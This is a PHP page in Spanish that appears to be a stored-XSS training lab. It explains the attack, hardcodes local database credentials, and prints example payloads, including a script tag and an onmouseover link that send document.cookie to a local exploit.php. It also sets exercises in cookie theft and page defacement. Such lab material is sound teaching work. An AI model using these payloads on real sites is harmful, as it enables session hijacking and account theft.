<?php
$servername = "127.0.0.1";
$database = "storexss";
$username = "cripto";
$password = "210622";
$secret = ""; // Encuentra el nombre escondido 

$link = mysqli_connect($servername, $username , $password, $database);

//En caso de que no se pueda conectar, mostrará los errores para debuggear
if (!$link) {
  echo "Error: Unable to connect to MySQL." . PHP_EOL;
  echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
  echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;
  exit;
}

//Eliminar todos los datos de la tabla
if (isset($_POST['clear']))
{
  $truncate_query = "TRUNCATE TABLE comentarios";
  if (mysqli_multi_query($link, $truncate_query)) 
  {
    echo "Se depuró la tabla.";
  } else {
    echo "Error:" . mysqli_error($link);
  }
}

//Crea una Cookie de manera aleatoria
if (isset($_POST['newCookie']))
{
  $cookie_name = "authKey";
  $cookie_value = md5(microtime());
  setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
  echo "<h2 align='center'> authKey Cookie SET! </h2>";
}

// Muestra la cookie 
if (isset($_POST['outputCookie']))
{
  if(isset($_COOKIE['authKey']))
  {
    echo "<h2 align='center'> authKey Cookie: ".$_COOKIE['authKey']."</h2>";
  }
  else
  {
    echo "<h2 align='center'> authKey Cookie: NOT SET </h2>";
  }
}

$redirect = 'https://es.wikipedia.org/wiki/Cross-site_scripting';
// Te saluda
if (isset($_GET['name']))
{
  echo "<p align='center'>Hola ".htmlspecialchars($_GET['name'], ENT_QUOTES)."! Bienvenido!</p>";

  if($_GET['name'] == $secret){
    echo '<script>alert("Tenemos un invitado muy especial! Bienvenido!"); window.location.href="'.$redirect.'";</script>';
  }
}

// Agrega comentarios a una base de datos
if (isset($_POST['comentario']))
{
  $comentario = strip_tags($_POST['comentario']); // Eliminar etiquetas HTML
  $comentario = htmlspecialchars($comentario, ENT_QUOTES); // Convertir caracteres especiales en entidades HTML
  $insert_sql = "INSERT INTO comentarios (comentario) VALUES ('".addslashes($comentario)."')";
  if ($link->query($insert_sql) === TRUE) 
  {
    echo "New record created successfully";
  } else {
    echo "Error: Unable to add comentario";
  }
}

// Mostrar todos los comentarios guardados hasta el momento
$sql = "SELECT comentario FROM comentarios";
$result = $link->query($sql);

if ($result->num_rows > 0) {

while($row = $result->fetch_assoc()) {
echo "<tr><td style='width:35%;padding:10px'>Comentario<br /><hr />".htmlspecialchars($row["comentario"])."<br /></td></tr>";
}
} else {
echo "<tr><td style='width:35%'>Sin Comentario!</td></tr>";
}
$link->close();

?>


<!DOCTYPE html>
<html>
<title> storexssecure </title>
<body>
  <h1> storexssecure Ejemplo </h1>
  <table>
    XSS es una técnica de ataque que inyecta código malicioso en aplicaciones web vulnerables. A diferencia de otros ataques, esta técnica no se dirige al servidor web en sí, sino al navegador del usuario. <br><br>
    El XSS almacenado es un tipo de XSS que almacena código malicioso en el servidor de aplicaciones. El uso de XSS almacenado solo es posible si su aplicación está diseñada para almacenar la entrada del usuario como en los siguientes ejemplos. <br><br>
    Un Stored cross-site scripting surge cuando una aplicación recibe datos de una fuente que no es de confianza e incluye esos datos dentro de sus respuestas HTTP posteriores de una manera insegura.<br> <br>
    Un ataque XSS almacenado normalmente funciona de la siguiente manera:
    <ul>
      <li>Un atacante inyecta código malicioso en una solicitud para enviar contenido a la aplicación.</li>
      <li>La aplicación cree que la solicitud es inocente, procesa la entrada del usuario y la almacena en la base de datos.</li>
      <li>A partir de este momento, cada vez que el contenido enviado se muestra a los usuarios, el código malicioso se ejecuta en sus navegadores.</li>
    </ul>
    Dependiendo del tipo de carga útil y de las vulnerabilidades presentes en el navegador del usuario, los ataques XSS almacenados pueden permitir a los atacantes:
    <ul>
      <li>Obtener la sesión del usuario y realizar acciones en su nombre</li>
      <li>Robar las credenciales del usuario</li>
      <li>Secuestro del navegador del usuario o entrega de exploits basados en el navegador</li>
      <li>Escaneo de puertos de los hosts a los que la aplicación web puede conectarse</li>
      <li>Desfiguración del sitio web</li>
    </ul>
    Si un atacante puede controlar un script que se ejecuta en el navegador de la víctima, entonces normalmente puede comprometer completamente a ese usuario. El atacante puede llevar a cabo cualquiera de las acciones que sean aplicables al impacto de las vulnerabilidades XSS reflejadas.<br><br>
    El atacante no necesita encontrar una forma externa de inducir a otros usuarios a hacer una solicitud en particular que contenga su explotación. Más bien, el atacante coloca su exploit en la propia aplicación y simplemente espera a que los usuarios la encuentren.<br>
    Para llevar acabo un ataque, basta con pensar en lo que desees hacer y pasarlo como entrada a alguna caja de texto. Por ejemplo
    <p style="padding: 10px; border: 1px solid black;"><i>< p> Confia en mi! < / p>< script src=”http://localhost/Proyecto03/exploit.php”> < / script></ i></p>
      El comentario se publica en la página y cada vez que la página se carga para un visitante, se ejecuta el script malicioso. En este caso, el script está diseñado para robar la cookie de sesión de un visitante, lo que significa que el atacante puede hacerse cargo de la cuenta de un usuario. <br> <br>
      También puede dejar direccionamientos como:
      <p style="padding: 10px; border: 1px solid black;"><i>< p> Seguro te gustará:<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="color: black; text-decoration: none;">
        < a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
        https://www.freephpnes.com/
        < / a>
      </a></p>
      O incluso esconder tu codigo malicioso en un link aparentemente normal como:

      <p style="padding: 10px; border: 1px solid black;"><i>< p> Seguro te gustará:<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="color: black; text-decoration: none;">
        < a href="https://www.youtube.com/watch?v=8UVNT4wvIGY" onmouseover="window.location='http://localhost/Proyecto03/exploit.php?cookie='+escape(document.cookie)">
        Gotye - Somebody That I Used To Know (feat. Kimbra) [Official Music Video]
        < / a>
      </a></p>


      Ahora te toca a ti. Intenta realizar los siguientes exploits:
      <ul>
        <li>Roba las cookies que generá la página.</li>
        <li>Un comentario con un direccionamientos oculto de manera que te abra una video de youtube.</li>
        <li>Guarda en la base de datos un script que cada que lo ejecutes, te muestre una alerta de que haz sido hackeado.</li>
        <li>Altera la página y crea problemas en esta de manera que ya no puedas acceder a ella.</li>
      </ul>
      <form action="storexssecure.php" method="post">
        <textarea rows="6" cols="50" name="comentario" placeholder="Deja un comentario" maxlength="400"></textarea>
        <table>
          <input type="submit" style="background: #0b7dda" value="Comentario" />
        </td></tr></table>
      </form>

      <br>
      <form action="storexssecure.php" method="post">
        <table ><tr><td>
          <input type="submit" style="background: #0b7dda" name="newCookie" value="New Cookie" />
          <input type="submit" style="background: #0b7dda" name="outputCookie" value="Output Cookie" />
        </td></tr></table>
      </form>
      <br>
      <form action="storexssecure.php" method="get">
        <table ><tr><td>
          Name:<input type="text" name="name" />
          <input type="submit" style="background: #0b7dda" value="Submit" />
        </td></tr></table>
      </form>
      <table>
        <tr><td>
          <form action="storexssecure.php" method="post">
            Debug: <input type="submit" style="background: #0b7dda" name="clear" value="clear" />
          </form>
        </td></tr>
      </table>
      <div style="text-align: left;"><a href="reflectedXxs.php">
      <button style="text-align: left; background: #0b7dda"><big>Anterior</big></button>
    </a></div>

    <!-- redireccionamos al archivo exploit.php -->
    </body>

    </html>


